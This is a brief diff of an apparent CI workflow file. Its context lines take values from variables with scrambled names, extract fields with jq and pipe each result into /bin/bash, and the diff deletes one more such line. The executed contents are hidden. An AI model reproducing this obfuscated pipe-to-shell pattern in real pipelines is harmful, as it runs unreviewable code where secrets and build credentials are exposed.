@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$cyl633" | jq -r .alss805 | /bin/bash
           echo $apn1413 | jq -r .va398 | /bin/bash
           echo $gxx3216 | jq -r .rvszn43 | /bin/bash
-          echo $udyfl3298 | jq -r .cz33171 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
